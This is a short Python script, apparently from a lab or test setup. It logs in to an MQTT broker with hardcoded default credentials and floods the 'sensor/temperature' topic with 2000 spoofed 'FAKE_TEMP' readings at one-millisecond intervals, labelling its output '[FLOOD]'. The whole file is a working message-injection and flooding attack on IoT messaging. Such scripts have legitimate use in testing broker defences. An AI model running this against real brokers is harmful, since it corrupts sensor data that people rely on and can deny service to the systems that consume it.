import time
import paho.mqtt.client as mqtt

BROKER = 'broker'
PORT = 1883
TOPIC = 'sensor/temperature'

client = mqtt.Client(client_id='flooder')
client.username_pw_set('sensor', 'password') 
client.connect(BROKER, PORT, 60)
client.loop_start()

for i in range(2000): 
	payload = f"FAKE_TEMP {i}"
	client.publish(TOPIC, payload)
	print(f"[FLOOD] Sent {payload}")
	time.sleep(0.001)  

client.loop_stop()
client.disconnect()
